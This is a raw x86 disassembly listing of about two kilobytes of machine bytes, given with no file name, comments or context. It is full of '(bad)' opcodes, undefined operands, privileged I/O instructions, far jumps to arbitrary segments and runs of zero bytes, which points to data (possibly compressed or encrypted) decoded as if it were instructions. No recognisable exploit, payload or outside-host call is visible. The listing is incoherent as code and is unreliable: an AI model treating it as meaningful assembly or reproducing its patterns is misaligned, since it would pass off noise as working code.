  41c654:	jno    0x41c693
  41c656:	adc    al,0x81
  41c658:	lahf   
  41c659:	fnsave [esp+ecx*1]
  41c65c:	hlt    
  41c65d:	sahf   
  41c65e:	xchg   edi,edi
  41c660:	mov    ch,BYTE PTR [eax-0x2d117cef]
  41c666:	sar    esp,0x36
  41c669:	jmp    0x7233856a
  41c66e:	stos   DWORD PTR es:[edi],eax
  41c66f:	jg     0x41c6dc
  41c671:	jns    0x41c634
  41c673:	xchg   BYTE PTR [eax],al
  41c675:	add    BYTE PTR [eax],al
  41c677:	add    BYTE PTR [eax],al
  41c679:	mov    eax,0x6abefdd7
  41c67e:	push   esi
  41c67f:	cmp    dh,bh
  41c681:	push   edx
  41c682:	popa   
  41c683:	std    
  41c684:	pop    ebp
  41c685:	fldcw  WORD PTR [eax-0x6ebcae7b]
  41c68b:	ror    DWORD PTR [ebx+eax*1],0xad
  41c68f:	lea    edx,[ebp+0x69]
  41c692:	cmp    DWORD PTR ds:0x87a87110,eax
  41c698:	pop    ebx
  41c699:	and    esi,DWORD PTR [ecx]
  41c69b:	ret    0x1a40
  41c69e:	fist   WORD PTR [edi]
  41c6a0:	aaa    
  41c6a1:	shl    BYTE PTR [edi+0x6a1cde3c],0xbe
  41c6a8:	cld    
  41c6a9:	add    ah,BYTE PTR [ebx]
  41c6ab:	dec    eax
  41c6ac:	adc    al,0x3e
  41c6ae:	jmp    0xfcc2:0x41368b11
  41c6b5:	scas   al,BYTE PTR es:[edi]
  41c6b6:	cdq    
  41c6b7:	sub    al,0xd
  41c6b9:	test   BYTE PTR [ebx],0xc2
  41c6bc:	cld    
  41c6bd:	fcmovu st,st(0)
  41c6bf:	jbe    0x41c6c1
  41c6c1:	inc    BYTE PTR [edx]
  41c6c3:	mov    ebp,0xf6fec0f7
  41c6c8:	pop    es
  41c6c9:	jo     0x41c749
  41c6cb:	rol    cl,0xb9
  41c6ce:	mov    ecx,0xe37c2a9
  41c6d3:	rcl    BYTE PTR [eax-0x7f],0x36
  41c6d7:	sbb    eax,0xf5b87eac
  41c6dc:	rol    DWORD PTR [eax],0x0
  41c6df:	add    BYTE PTR [eax],al
  41c6e1:	add    bl,dh
  41c6e3:	aas    
  41c6e4:	sar    esi,cl
  41c6e6:	ror    DWORD PTR [ecx],cl
  41c6e8:	je     0x41c6fd
  41c6ea:	mov    edi,DWORD PTR [ecx+0x2620fddd]
  41c6f0:	out    0x84,al
  41c6f2:	mov    BYTE PTR [edi+0x7081c1cd],dh
  41c6f8:	jmp    0xb5308789
  41c6fd:	or     BYTE PTR [ebp+0x6286e603],al
  41c703:	mov    bh,0xad
  41c705:	shl    DWORD PTR [ebp-0x7de7d447],0x47
  41c70c:	repz aas 
  41c70e:	and    ebp,DWORD PTR [ebx-0x46c64080]
  41c714:	pop    edi
  41c715:	inc    edi
  41c716:	mov    ebp,edi
  41c718:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c719:	adc    esi,edi
  41c71b:	fdivr  DWORD PTR [ebx-0x3f]
  41c71e:	and    ebp,edi
  41c720:	adc    al,0x30
  41c722:	push   0x11bf2a85
  41c727:	mov    ecx,0x8d7579f5
  41c72c:	mov    ah,0xf7
  41c72e:	or     dh,bh
  41c730:	test   BYTE PTR [edx],0x68
  41c733:	jle    0x41c759
  41c735:	mov    edi,0xc0a9b8f1
  41c73a:	aaa    
  41c73b:	push   cs
  41c73c:	add    BYTE PTR [edi-0x77],cl
  41c73f:	add    BYTE PTR ss:[edi],dl
  41c742:	push   cs
  41c743:	jno    0x41c73f
  41c745:	add    BYTE PTR cs:[eax],al
  41c748:	add    BYTE PTR [eax],al
  41c74a:	add    BYTE PTR [edi+edi*2+0x77c9fd42],dh
  41c751:	or     al,0x6c
  41c753:	push   edx
  41c754:	mov    esp,0x56b816fc
  41c759:	ins    BYTE PTR es:[edi],dx
  41c75a:	fdivp  st(1),st
  41c75c:	mov    bh,dl
  41c75e:	push   es
  41c75f:	mov    ah,0x5
  41c761:	mov    dh,0xea
  41c763:	icebp  
  41c764:	dec    esi
  41c765:	xor    al,0xff
  41c767:	jb     0x41c77b
  41c769:	adc    dh,bl
  41c76b:	sti    
  41c76c:	xchg   esp,eax
  41c76d:	cli    
  41c76e:	out    0xb5,al
  41c770:	inc    ecx
  41c771:	std    
  41c772:	and    al,0x5d
  41c774:	icebp  
  41c775:	dec    edx
  41c776:	std    
  41c777:	cmp    bl,al
  41c779:	out    0x67,al
  41c77b:	xor    esi,DWORD PTR [edi+0xeb370fc]
  41c781:	cmp    DWORD PTR [eax-0x4b87747b],ebp
  41c787:	xor    eax,0x850f38b7
  41c78c:	add    eax,0xb70a4181
  41c791:	cld    
  41c792:	out    dx,al
  41c793:	mov    esp,0x3d3f8902
  41c798:	scas   al,BYTE PTR es:[edi]
  41c799:	add    edi,ecx
  41c79b:	xchg   BYTE PTR ds:0xb6ea0b84,al
  41c7a1:	cld    
  41c7a2:	sub    dh,BYTE PTR [eax*2+0xeabb014]
  41c7a9:	jl     0x41c73a
  41c7ab:	fist   WORD PTR [ebx-0x5]
  41c7ae:	data16 add BYTE PTR [eax],al
  41c7b1:	add    BYTE PTR [eax],al
  41c7b3:	add    BYTE PTR ds:0x7aa6b607,dh
  41c7b9:	add    eax,0x7773a6b6
  41c7be:	(bad)  
  41c7c0:	xor    DWORD PTR [edi-0x76],0xff0ab000
  41c7c7:	jmp    0x12cd:0x47b612d3
  41c7ce:	mov    dh,0x4f
  41c7d0:	faddp  st(4),st
  41c7d2:	fmul   QWORD PTR [eax]
  41c7d4:	mov    esp,0x24cf7ff
  41c7da:	push   esp
  41c7db:	je     0x41c84d
  41c7dd:	ins    BYTE PTR es:[edi],dx
  41c7de:	(bad)  
  41c7df:	in     al,0x83
  41c7e1:	ret    0xb60b
  41c7e4:	jecxz  0x41c7e4
  41c7e6:	or     dh,BYTE PTR [esi-0x1e42fff5]
  41c7ec:	xchg   esp,eax
  41c7ed:	push   es
  41c7ee:	retf   0xf189
  41c7f1:	outs   dx,DWORD PTR ds:[esi]
  41c7f2:	dec    eax
  41c7f4:	push   edi
  41c7f5:	dec    eax
  41c7f6:	adc    al,0xf
  41c7f8:	adc    BYTE PTR [ecx],al
  41c7fa:	(bad)  
  41c7fb:	dec    DWORD PTR [esp+eax*4+0x5c061f4]
  41c802:	ret    
  41c803:	inc    ebp
  41c804:	jl     0x41c80a
  41c806:	add    BYTE PTR [eax],al
  41c808:	dec    esp
  41c809:	ins    BYTE PTR es:[edi],dx
  41c80a:	dec    ebx
  41c80b:	sub    DWORD PTR [ecx-0x6a150362],0xffffff8b
  41c812:	inc    ecx
  41c813:	and    al,0x9c
  41c815:	dec    esi
  41c816:	sti    
  41c817:	jne    0x41c819
  41c819:	add    BYTE PTR [eax],al
  41c81b:	add    BYTE PTR [eax],al
  41c81d:	sub    al,0x8
  41c81f:	mov    dh,0x7
  41c821:	jecxz  0x41c81b
  41c823:	sbb    ecx,DWORD PTR [edi]
  41c825:	retf   0xc48e
  41c828:	ins    DWORD PTR es:[edi],dx
  41c829:	pop    esp
  41c82a:	(bad)  
  41c82b:	cli    
  41c82c:	jne    0x41c842
  41c82e:	add    al,0xd3
  41c830:	push   esi
  41c831:	mov    ds:0xd78b0ff9,eax
  41c836:	jbe    0x41c8a9
  41c838:	or     al,0x93
  41c83a:	stc    
  41c83b:	pop    es
  41c83c:	call   0x3d2678
  41c841:	jne    0x41c869
  41c843:	les    esi,FWORD PTR [ebx+0x7e]
  41c846:	push   es
  41c847:	push   ds
  41c848:	cld    
  41c849:	jmp    0xb4:0x49830d3f
  41c850:	add    BYTE PTR [edx+0x37],ch
  41c853:	inc    ebp
  41c854:	inc    DWORD PTR [ebx-0x4bfdb2d1]
  41c85a:	or     BYTE PTR [ecx+ecx*1],cl
  41c85d:	mov    ah,0xab
  41c85f:	mov    eax,0x368030c
  41c864:	or     eax,0xbefe97eb
  41c869:	xchg   ebp,eax
  41c86a:	mov    al,0x9
  41c86c:	mov    edi,0x53f874f5
  41c871:	and    DWORD PTR [ebp-0x7f],eax
  41c874:	jp     0x41c8cb
  41c876:	test   eax,0xabd7830d
  41c87b:	add    BYTE PTR [eax],al
  41c87d:	jb     0x41c80e
  41c87f:	add    eax,0xd
  41c884:	add    BYTE PTR [eax],al
  41c886:	ret    
  41c887:	sub    cl,cl
  41c889:	push   0xffffffb5
  41c88b:	stos   DWORD PTR es:[edi],eax
  41c88c:	add    eax,edi
  41c88e:	pop    esi
  41c88f:	push   ss
  41c890:	mov    DWORD PTR [edx-0x77],edx
  41c893:	push   ecx
  41c894:	add    bh,ch
  41c896:	loopne 0x41c867
  41c898:	mov    ebp,0xbd0d6d72
  41c89d:	jb     0x41c904
  41c89f:	pop    esp
  41c8a0:	aaa    
  41c8a1:	or     al,0x42
  41c8a3:	(bad)  
  41c8a5:	call   0xfcff54e7
  41c8aa:	clc    
  41c8ab:	imul   ecx,DWORD PTR ds:0xb22d83,0x0
  41c8b2:	out    dx,al
  41c8b3:	mov    dh,0xe0
  41c8b5:	call   0x2491e908
  41c8ba:	dec    BYTE PTR [esi]
  41c8bc:	sbb    BYTE PTR [edi],bh
  41c8be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8bf:	add    dh,BYTE PTR [edi+0x721687be]
  41c8c5:	retf   0x2ff9
  41c8c8:	aas    
  41c8c9:	push   ebp
  41c8ca:	lock das 
  41c8cc:	idiv   DWORD PTR [esi+0x38460667]
  41c8d2:	ins    DWORD PTR es:[edi],dx
  41c8d3:	stos   BYTE PTR es:[edi],al
  41c8d4:	xor    DWORD PTR [ebx-0x3c944a27],esp
  41c8da:	cmp    DWORD PTR [edi+0x21],0x6a027509
  41c8e1:	(bad)  
  41c8e2:	jne    0x41c865
  41c8e4:	and    ebx,0xffffffba
  41c8e7:	mov    ah,ch
  41c8e9:	cli    
  41c8ea:	add    BYTE PTR [eax],al
  41c8ec:	add    BYTE PTR [eax],al
  41c8ee:	add    BYTE PTR [eax],bh
  41c8f0:	dec    BYTE PTR ds:0x2d807805
  41c8f6:	mov    ds:0xbb90b5a1,eax
  41c8fb:	xchg   ebx,eax
  41c8fc:	gs loopne 0x41c902
  41c8ff:	jne    0x41c929
  41c901:	add    ch,BYTE PTR [edx+edx*8-0x13fc18f8]
  41c908:	inc    edi
  41c909:	add    ecx,DWORD PTR ds:0x42e84dc3
  41c90f:	ret    0x53b5
  41c912:	in     al,0xff
  41c914:	cmp    al,0xe9
  41c916:	mov    esp,0x477016e7
  41c91b:	imul   esi,DWORD PTR [ebp-0x3703e3c5],0x12c7bd14
  41c925:	aaa    
  41c926:	or     eax,0x75edfd0b
  41c92b:	mov    edx,0x754403ca
  41c930:	mov    ch,0x13
  41c932:	or     al,0x74
  41c934:	mov    ebp,0x261ad3e9
  41c939:	xchg   DWORD PTR [ebp+0x70ff8919],edi
  41c93f:	div    BYTE PTR [ebp-0x4a3792e6]
  41c945:	jb     0x41c94b
  41c947:	shr    BYTE PTR [esi],0x70
  41c94a:	pop    esi
  41c94b:	inc    edx
  41c94c:	push   es
  41c94d:	std    
  41c94e:	cld    
  41c94f:	xchg   esi,eax
  41c950:	or     al,0x40
  41c952:	jmp    0x41c957
  41c957:	add    BYTE PTR [edi+0x4d],cl
  41c95a:	sub    DWORD PTR [ecx],0xffffffaa
  41c95d:	or     eax,DWORD PTR [edi+0x4489a69f]
  41c963:	ss push ds
  41c965:	dec    eax
  41c966:	or     ch,cl
  41c968:	jbe    0x41c8ed
  41c96a:	mov    ebp,0x27985
  41c96f:	jmp    0xaccac6f7
  41c974:	cmp    BYTE PTR [ebp-0x7b],0x6d
  41c978:	jno    0x41c97c
  41c97a:	add    BYTE PTR [edx-0x48],dh
  41c97d:	fwait
  41c97e:	xor    esi,ebx
  41c980:	jbe    0x41c984
  41c982:	mov    DWORD PTR [edx+ebx*4+0x43ee4ff4],ebp
  41c989:	loop   0x41c997
  41c98b:	lahf   
  41c98c:	jns    0x41c945
  41c98e:	jb     0x41c98d
  41c990:	imul   ebp,DWORD PTR [edi+ecx*4-0x5f],0xce0042a3
  41c998:	mov    ds:0xc89e011a,eax
  41c99d:	mov    ch,0x72
  41c99f:	fldln2 
  41c9a1:	retf   0x3cfc
  41c9a4:	gs mov ch,0x72
  41c9a7:	loope  0x41c9c7
  41c9a9:	mov    ch,0xdc
  41c9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ac:	add    DWORD PTR [ecx-0x4b0c1141],eax
  41c9b2:	push   es
  41c9b3:	jmp    0x8d5b442e
  41c9b8:	jmp    0x42b073
  41c9bd:	add    BYTE PTR [eax],al
  41c9bf:	add    BYTE PTR [eax],al
  41c9c1:	xchg   esi,eax
  41c9c2:	push   0xfffffffb
  41c9c4:	jmp    DWORD PTR [edi+0x6c40243c]
  41c9ca:	jne    0x41ca3d
  41c9cc:	and    BYTE PTR [ebx],ch
  41c9ce:	cs add al,0xff
  41c9d1:	and    DWORD PTR [ebx+ecx*1],edx
  41c9d4:	mov    dh,0x7c
  41c9d6:	(bad)  
  41c9d7:	imul   eax,DWORD PTR [eax-0x24],0xdf187176
  41c9de:	into   
  41c9df:	push   edx
  41c9e0:	jmp    DWORD PTR [ecx]
  41c9e2:	adc    BYTE PTR [edi+0xbec9bcb],al
  41c9e8:	call   DWORD PTR [ecx]
  41c9ea:	or     al,ch
  41c9ec:	les    edi,FWORD PTR [ebx+0x76]
  41c9ef:	sti    
  41c9f0:	test   DWORD PTR [esi+eax*1-0x3a3b7f],ecx
  41c9f7:	push   DWORD PTR [edi-0x48c59]
  41c9fd:	jne    0x41ca53
  41c9ff:	out    0xff,eax
  41ca01:	jnp    0x41c98d
  41ca03:	inc    ecx
  41ca04:	and    al,0x8b
  41ca06:	sub    eax,0x4fdc0154
  41ca0b:	sti    
  41ca0c:	jne    0x41c9ca
  41ca0e:	push   es
  41ca0f:	mov    dh,0x7
  41ca11:	fwait
  41ca12:	icebp  
  41ca13:	sbb    ecx,DWORD PTR [edi]
  41ca15:	loop   0x41ca95
  41ca17:	les    ebp,FWORD PTR [ebp-0x64]
  41ca1a:	(bad)  
  41ca1b:	cli    
  41ca1c:	jne    0x41ca82
  41ca1e:	cld    
  41ca1f:	ret    0x3b56
  41ca22:	icebp  
  41ca23:	lsl    eax,WORD PTR [eax]
  41ca26:	add    BYTE PTR [eax],al
  41ca28:	add    BYTE PTR [eax],al
  41ca2a:	cld    
  41ca2b:	jbe    0x41ca9e
  41ca2d:	or     al,0xd7
  41ca2f:	ret    
  41ca30:	sti    
  41ca31:	jne    0x41ca87
  41ca33:	addr16 jge 0x41ca15
  41ca36:	sbb    esi,DWORD PTR [edi-0x7f]
  41ca39:	ror    BYTE PTR [ebx-0x7e],0x7d
  41ca3d:	or     DWORD PTR [ebp-0x57],esi
  41ca40:	add    BYTE PTR [eax-0x3477a72],bh
  41ca46:	mul    BYTE PTR [ebx+0x5]
  41ca49:	xchg   ebx,ebx
  41ca4b:	push   esp
  41ca4c:	add    al,0x0
  41ca4e:	jne    0x41c9d2
  41ca50:	sub    DWORD PTR [edi],eax
  41ca52:	jne    0x41c9fd
  41ca54:	lea    eax,[edx+0x59]
  41ca57:	imul   edx,DWORD PTR [eax-0x3],0xb6090980
  41ca5e:	jp     0x41caac
  41ca60:	das    
  41ca61:	sbb    al,0x7a
  41ca63:	mov    edx,DWORD PTR [ebx+0x6950c7]
  41ca69:	std    
  41ca6a:	pusha  
  41ca6b:	mov    eax,ds:0xec2bd505
  41ca70:	cs adc dh,bh
  41ca73:	fistp  QWORD PTR [eax+0x2edc7172]
  41ca79:	or     ch,cl
  41ca7b:	lahf   
  41ca7c:	frndint 
  41ca7e:	mov    dl,0x25
  41ca80:	les    ecx,FWORD PTR [eax+esi*8]
  41ca83:	iret   
  41ca84:	or     eax,DWORD PTR [eax]
  41ca86:	jne    0x41caba
  41ca88:	pop    edx
  41ca89:	jo     0x41ca68
  41ca8b:	aam    0xb4
  41ca8d:	cld    
  41ca8e:	add    BYTE PTR [eax],al
  41ca90:	add    BYTE PTR [eax],al
  41ca92:	add    BYTE PTR [edx-0x75162cff],dl
  41ca98:	mov    ds:0xac59428d,eax
  41ca9d:	outs   dx,BYTE PTR ds:[esi]
  41ca9e:	push   esp
  41ca9f:	je     0x41ca8a
  41caa1:	push   ebx
  41caa2:	std    
  41caa3:	call   0x72f7d3a3
  41caa8:	shr    BYTE PTR [edi],0x1c
  41caab:	jb     0x41cade
  41caad:	add    edi,0xfd03dbc8
  41cab3:	enter  0x5d3,0xc5
  41cab7:	mov    ds:0x76102f60,eax
  41cabc:	add    dh,BYTE PTR [edi+0x71fec7ba]
  41cac2:	into   
  41cac3:	xor    DWORD PTR [eax],edi
  41cac5:	fild   QWORD PTR [ebx-0x45722ed9]
  41cacb:	test   edx,0xfb2780f5
  41cad1:	out    0x3,al
  41cad3:	hlt    
  41cad4:	leave  
  41cad5:	call   0x2f745366
  41cada:	sbb    BYTE PTR [ecx],al
  41cadc:	mov    dl,0x65
  41cade:	lods   al,BYTE PTR ds:[esi]
  41cadf:	pop    ss
  41cae0:	sti    
  41cae1:	out    0x3,al
  41cae3:	cld    
  41cae4:	inc    edi
  41cae5:	or     eax,DWORD PTR [ebp+eax*2-0x4f]
  41cae9:	shl    ebx,cl
  41caeb:	jno    0x41cb65
  41caed:	in     eax,dx
  41caee:	mov    edx,0x71ee0e67
  41caf3:	add    bh,BYTE PTR [ebx+0x43c3]
  41caf9:	add    BYTE PTR [eax],al
  41cafb:	add    BYTE PTR [ebp-0x4f],dh
  41cafe:	mov    bl,0x1b
  41cb00:	je     0x41cadb
  41cb02:	mov    esp,0x721247ba
  41cb07:	into   
  41cb08:	mov    cl,0x37
  41cb0a:	jecxz  0x41cac6
  41cb0c:	daa    
  41cb0d:	cli    
  41cb0e:	(bad)  
  41cb0f:	je     0x41cad1
  41cb11:	mov    cl,0x5
  41cb13:	sbb    dl,0x1
  41cb16:	fs jne 0x41cb93
  41cb19:	add    ah,bh
  41cb1b:	jnp    0x41cb85
  41cb1d:	scas   al,BYTE PTR es:[edi]
  41cb1e:	in     eax,dx
  41cb1f:	mov    ecx,0xb9d13d9b
  41cb24:	jns    0x41cba3
  41cb26:	and    esp,eax
  41cb28:	cmp    DWORD PTR [eax+0x3d],0xce52b503
  41cb2f:	das    
  41cb30:	xchg   ebp,eax
  41cb31:	add    DWORD PTR [ebp+0x1],edi
  41cb34:	pop    eax
  41cb35:	aaa    
  41cb36:	fisttp DWORD PTR [eax]
  41cb38:	or     eax,DWORD PTR [edx+0x4292a0ff]
  41cb3e:	add    BYTE PTR [esi-0x51fef56e],ch
  41cb44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb45:	scas   eax,DWORD PTR es:[edi]
  41cb46:	jb     0x41cb41
  41cb48:	jns    0x41cb1c
  41cb4a:	cld    
  41cb4b:	sbb    al,0x7d
  41cb4d:	jnp    0x41cb17
  41cb4f:	mov    ss,WORD PTR [edx-0x6]
  41cb52:	out    0x16,eax
  41cb54:	aas    
  41cb55:	scas   al,BYTE PTR es:[edi]
  41cb56:	cld    
  41cb57:	fs cmp esi,edi
  41cb5a:	add    BYTE PTR [esi],0x79
  41cb5d:	add    al,BYTE PTR [eax]
  41cb5f:	xor    DWORD PTR [eax],eax
  41cb61:	add    BYTE PTR [eax],al
  41cb63:	add    BYTE PTR [eax],al
  41cb65:	pop    edi
  41cb66:	scas   al,BYTE PTR es:[edi]
  41cb67:	cld    
  41cb68:	data16 into 
  41cb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb6b:	std    
  41cb6c:	pop    esi
  41cb6d:	sub    al,0x7a
  41cb6f:	inc    ebp
  41cb70:	in     eax,0xb7
  41cb72:	iret   
  41cb73:	add    DWORD PTR [edx-0x7b],esp
  41cb76:	mov    cl,0x87
  41cb78:	mov    ah,0x6a
  41cb7a:	jnp    0x41cbc7
  41cb7c:	call   0x458c5353
  41cb81:	clc    
  41cb82:	adc    BYTE PTR ds:[edx],al
  41cb85:	cmp    dh,BYTE PTR [esi+0x7c06bc86]
  41cb8b:	add    esi,DWORD PTR [ecx+0x0]
  41cb8e:	or     DWORD PTR [edi-0x7286115c],eax
  41cb94:	gs jns 0x41cb99
  41cb97:	add    BYTE PTR [eax+0x32],dh
  41cb9a:	call   0x6a68:0x3ea03288
  41cba1:	inc    edx
  41cba2:	scas   al,BYTE PTR es:[edi]
  41cba3:	popa   
  41cba4:	pusha  
  41cba5:	jno    0x41cbdc
  41cba7:	pop    es
  41cba8:	scas   al,BYTE PTR es:[edi]
  41cba9:	cmp    esp,edx
  41cbab:	add    ecx,ebp
  41cbad:	jbe    0x41cbb1
  41cbaf:	jmp    0x2066bda1
  41cbb4:	jmp    0x6610aa
  41cbb9:	mov    WORD PTR [ebx+0x41],?
  41cbbc:	and    al,0x13
  41cbbe:	loope  0x41cbe3
  41cbc0:	bswap  edx
  41cbc2:	add    bh,bl
  41cbc4:	jne    0x41cc32
  41cbc6:	stc    
  41cbc7:	mov    ch,0x90
  41cbc9:	add    BYTE PTR [eax],al
  41cbcb:	add    BYTE PTR [eax],al
  41cbcd:	add    BYTE PTR [ecx+ebp*8],al
  41cbd0:	aas    
  41cbd1:	add    BYTE PTR [ebx],dl
  41cbd3:	loope  0x41cbf0
  41cbd5:	add    ebp,ebx
  41cbd7:	push   0x71
  41cbd9:	sbb    BYTE PTR [edi+0x19ff52be],dl
  41cbdf:	adc    al,0xfb
  41cbe1:	jne    0x41cc03
  41cbe3:	imul   esi,DWORD PTR [ecx+0x8],0xfffffff4
  41cbe7:	popa   
  41cbe8:	fcos   
  41cbea:	xchg   ebx,eax
  41cbeb:	xor    BYTE PTR [ebp+0x1ab90774],bh
  41cbf1:	cld    
  41cbf2:	push   ebx
  41cbf3:	push   0xb
  41cbf5:	test   DWORD PTR [ebx+0x57000002],esp
  41cbfb:	dec    eax
  41cbfc:	call   0xfd712e8a
  41cc01:	(bad)  
  41cc02:	fdiv   st(2),st
  41cc04:	mov    ch,0x4f
  41cc06:	(bad)  
  41cc08:	mov    ch,0x57
  41cc0a:	into   
  41cc0b:	(bad)  
  41cc0c:	fisttp QWORD PTR [eax]
  41cc0e:	(bad)  
  41cc0f:	mov    ebp,0xaa1cf8ff
  41cc14:	push   eax
  41cc15:	je     0x41cc4e
  41cc17:	jle    0x41cc6b
  41cc19:	or     al,0x17
  41cc1b:	dec    eax
  41cc1c:	adc    al,0x8b
  41cc1e:	icebp  
  41cc1f:	jae    0x41cba6
  41cc21:	cmp    al,0xad
  41cc23:	jle    0x41cc77
  41cc25:	or     al,0x17
  41cc27:	clc    
  41cc28:	jmp    0x41cbb3
  41cc2a:	adc    BYTE PTR [esp+eax*1],dl
  41cc2d:	mov    eax,DWORD PTR [edx+0x16]
  41cc30:	daa    
  41cc31:	dec    ebp
  41cc32:	add    BYTE PTR [eax],al
  41cc34:	add    BYTE PTR [eax],al
  41cc36:	add    BYTE PTR [eax+0x7b],cl
  41cc39:	push   edx
  41cc3a:	or     al,0x75
  41cc3c:	and    al,0x37
  41cc3e:	clc    
  41cc3f:	in     al,dx
  41cc40:	cld    
  41cc41:	mov    DWORD PTR [edx],edi
  41cc43:	jnp    0x41cc0a
  41cc45:	mov    ah,0xfc
  41cc47:	leave  
  41cc48:	mov    dl,0x89
  41cc4a:	inc    edx
  41cc4b:	jns    0x41cc6f
  41cc4d:	jle    0x41cbea
  41cc4f:	jne    0x41cbea
  41cc51:	add    BYTE PTR [ecx],dh
  41cc53:	xor    eax,0x75047d92
  41cc58:	cdq    
  41cc59:	mov    DWORD PTR [edx+0x51],eax
  41cc5c:	fst    DWORD PTR [ebx-0x3]
  41cc5f:	test   al,0xb9
  41cc61:	add    eax,0x2e8872b6
  41cc66:	sbb    al,0x82
  41cc68:	not    DWORD PTR [ebx+0x3d998c7]
  41cc6e:	std    
  41cc6f:	mov    cl,dl
  41cc71:	add    ebp,edx
  41cc73:	mov    ds:0xfe102f28,eax
  41cc78:	repz mov ah,0x72
  41cc7b:	jns    0x41ccd5
  41cc7d:	das    
  41cc7e:	or     ch,cl
  41cc80:	imul   edx,edi,0xfffffffc
  41cc83:	ficomp DWORD PTR ds:0x8bf80cc4
  41cc89:	std    
  41cc8a:	dec    edx
  41cc8c:	inc    ecx
  41cc8d:	mov    bl,0xe7
  41cc8f:	ret    0xf8df
  41cc92:	pop    edx
  41cc93:	ins    DWORD PTR es:[edi],dx
  41cc94:	mov    ds,WORD PTR [eax]
  41cc96:	aaa    
  41cc97:	inc    ebx
  41cc98:	jne    0x41ccc9
  41cc9a:	scas   al,BYTE PTR es:[edi]
  41cc9b:	add    BYTE PTR [eax],al
  41cc9d:	add    BYTE PTR [eax],al
  41cc9f:	add    BYTE PTR [edi+eiz*2+0x58],ch
  41cca3:	je     0x41cd18
  41cca5:	and    al,0x7e
  41cca7:	xchg   DWORD PTR [ebp-0x67],esi
  41ccaa:	add    BYTE PTR [ecx],al
  41ccac:	cmp    edx,DWORD PTR [ecx+0x2d7d42fb]
  41ccb2:	call   0xf585:0x8bc93888
  41ccb9:	add    edi,esp
  41ccbb:	add    esi,DWORD PTR [ebp+0x79]
  41ccbe:	and    ecx,DWORD PTR [edx+esi*8]
  41ccc1:	inc    esp
  41ccc2:	push   edi
  41ccc3:	mov    esi,DWORD PTR [edi-0x182a002]
  41ccc9:	add    ah,bh
  41cccb:	add    edi,esp
  41cccd:	inc    edi
  41ccce:	mov    ebx,0xa70a22ae
  41ccd3:	loopne 0x41cd3f
  41ccd5:	scas   al,BYTE PTR es:[edi]
  41ccd6:	lods   eax,DWORD PTR ds:[esi]
  41ccd7:	mov    dh,0xf3
  41ccd9:	dec    esp
  41ccda:	sbb    eax,DWORD PTR [edx+ebx*1+0x7]
  41ccde:	out    0x3,al
  41cce0:	jne    0x41ccd3
  41cce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cce3:	inc    ebx
  41cce4:	sbb    ch,BYTE PTR [edi-0x28afc1c]
  41ccea:	cmp    al,0x3e
  41ccec:	adc    bh,ch
  41ccee:	xor    al,0x4e
  41ccf0:	ja     0x41cd6b
  41ccf2:	and    al,0x20
  41ccf4:	ret    0xdea2
  41ccf7:	or     dh,BYTE PTR [edi]
  41ccf9:	add    ch,BYTE PTR [eax]
  41ccfb:	mov    WORD PTR [edi],?
  41ccfd:	loop   0x41cd20
  41ccff:	lds    esp,FWORD PTR [edi+0x4]
  41cd02:	push   0x20
  41cd04:	add    BYTE PTR [eax],al
  41cd06:	add    BYTE PTR [eax],al
  41cd08:	add    cl,cl
  41cd0a:	add    al,BYTE PTR [edx+0x13]
  41cd0d:	push   0x8002ae74
  41cd12:	je     0x41ccba
  41cd14:	dec    DWORD PTR [ebx]
  41cd16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd17:	fimul  WORD PTR [edx]
  41cd19:	lods   eax,DWORD PTR ds:[esi]
  41cd1a:	jnp    0x41ccb7
  41cd1c:	iret   
  41cd1d:	in     eax,dx
  41cd1e:	test   BYTE PTR [edx+0x3],bh
  41cd21:	jne    0x41cd25
  41cd23:	jo     0x41cd65
  41cd25:	lds    edi,FWORD PTR [edi-0x55]
  41cd28:	sar    ebx,cl
  41cd2a:	test   BYTE PTR [edx+0x3],dh
  41cd2d:	jne    0x41cd31
  41cd2f:	jb     0x41cd6e
  41cd31:	and    DWORD PTR gs:0x2ff202,0xe040f111
  41cd3c:	push   0xffffffbe
  41cd3e:	(bad)  
  41cd40:	repnz sti 
  41cd42:	ja     0x41cd33
  41cd44:	fbld   TBYTE PTR [eax]
  41cd46:	scas   al,BYTE PTR es:[edi]
  41cd47:	xchg   BYTE PTR [edi*1+0x29621b9a],ah
  41cd4e:	ins    BYTE PTR es:[edi],dx
  41cd4f:	fsubp  st(3),st
  41cd51:	or     DWORD PTR [eax],edx
  41cd53:	mov    eax,0x8702b4aa
  41cd58:	sub    al,0x1d
  41cd5a:	cmp    BYTE PTR [edi-0x5e4c7cc],0x90
  41cd61:	mov    dl,0x7
  41cd63:	add    cl,ch
  41cd65:	std    
  41cd66:	aas    
  41cd67:	loopne 0x41cd11
  41cd69:	fld    DWORD PTR [edx]
  41cd6b:	push   eax
  41cd6c:	mov    es,WORD PTR [eax]
  41cd6e:	add    BYTE PTR [eax],al
  41cd70:	add    BYTE PTR [eax],al
  41cd72:	dec    ebx
  41cd73:	(bad)  
  41cd74:	cld    
  41cd75:	cld    
  41cd76:	sub    ch,BYTE PTR [esi+0x4278bd12]
  41cd7c:	add    BYTE PTR [edx+0x42],ah
  41cd7f:	adc    cl,BYTE PTR [ecx+0x4284151c]
  41cd85:	dec    ebp
  41cd86:	cld    
  41cd87:	aas    
  41cd88:	and    BYTE PTR [ebx+0x71],dh
  41cd8b:	add    ebx,0xffffffe5
  41cd8e:	jmp    0xfda5:0xf44e194b
  41cd95:	push   0x10
  41cd97:	add    edi,DWORD PTR [edi]
  41cd99:	jo     0x41cdcd
  41cd9b:	out    0xfc,al
  41cd9d:	mov    esp,0x29b5fda2
  41cda2:	jo     0x41ce18
  41cda4:	(bad)  
  41cda5:	xor    DWORD PTR [edx+0x42],ebx
  41cda8:	add    dl,ch
  41cdaa:	cmp    esp,edx
  41cdac:	push   esp
  41cdad:	push   ss
  41cdae:	push   edx
  41cdaf:	push   cs
  41cdb0:	mov    DWORD PTR [edx],esp
  41cdb2:	loopne 0x41cde3
  41cdb4:	sbb    BYTE PTR [eax],al
  41cdb6:	bnd jne 0x41ce2a
  41cdb9:	adc    BYTE PTR [ebx+0x1ff0bdb],cl
  41cdbf:	stc    
  41cdc0:	out    0x24,eax
